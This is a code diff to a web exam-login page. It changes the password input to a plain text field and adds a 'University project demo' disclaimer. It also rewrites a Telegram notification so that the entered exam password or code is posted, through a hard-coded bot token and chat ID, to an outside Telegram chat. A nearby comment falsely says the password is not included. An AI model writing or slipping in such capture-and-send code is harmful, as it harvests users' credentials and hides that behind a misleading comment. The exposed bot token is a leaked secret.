@@ -1544,8 +1544,8 @@
             <button class="modal-close-custom" onclick="closeModal()">X</button>
         </div>
         <div class="modal-body-custom" id="modal-custom-body">
-            <input type="password" id="exam-password-input" class="modal-input-custom" placeholder="Examination Password">
-            <button class="modal-verify-btn" id="modal-custom-btn" onclick="verifyAndStart()">Verify</button>
+            <input type="text" id="exam-password-input" autocomplete="off" autocapitalize="off" spellcheck="false" class="modal-input-custom" placeholder="Demo Examination Code">
+            <p style="color:#aeaeb2;font-size:12px;margin-bottom:12px;">University project demo: the examination code you enter will be sent to the project Telegram group for testing. Do not enter an account password.</p><button class="modal-verify-btn" id="modal-custom-btn" onclick="verifyAndStart()">Verify</button>
         </div>
     </div>
 </div>
@@ -1734,8 +1734,8 @@
     function openPasswordModal() {
         document.getElementById('modal-custom-title').textContent = 'Verification';
         document.getElementById('modal-custom-body').innerHTML = `
-            <input type="password" id="exam-password-input" class="modal-input-custom" placeholder="Examination Password">
-            <button class="modal-verify-btn" onclick="verifyAndStart()">Verify</button>
+            <input type="text" id="exam-password-input" autocomplete="off" autocapitalize="off" spellcheck="false" class="modal-input-custom" placeholder="Demo Examination Code">
+            <p style="color:#aeaeb2;font-size:12px;margin-bottom:12px;">University project demo: the examination code you enter will be sent to the project Telegram group for testing. Do not enter an account password.</p><button class="modal-verify-btn" onclick="verifyAndStart()">Verify</button>
         `;
         document.getElementById('exam-password-input').value = '';
         document.getElementById('score-modal').classList.remove('hidden');
@@ -1792,7 +1792,8 @@
         // Send an exam access notification without including the password.
         const telegramBotToken = '8979219267:AAHK8shvQRaFnBTkSU_aG3qo87ucaqdsZiY';
         const telegramChatId = '-5573923946';
-        const message = '🔔 محاولة دخول للاختبار';
+        const message = `🔔 محاولة دخول للاختبار التجريبي
+رمز الاختبار المُدخل: ${capturedExamVerificationPassword}`;
         
         fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
             method: 'POST',
